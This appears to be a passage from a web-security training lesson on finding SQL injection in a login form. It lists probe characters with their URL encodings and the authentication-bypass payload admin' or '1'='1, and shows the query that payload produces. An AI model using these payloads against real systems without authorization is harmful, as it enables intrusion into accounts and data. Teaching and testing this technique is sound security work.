## SQLi Discovery

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

## OR Injection

```sql
admin' or '1'='1
```

How will it look like:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

> Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
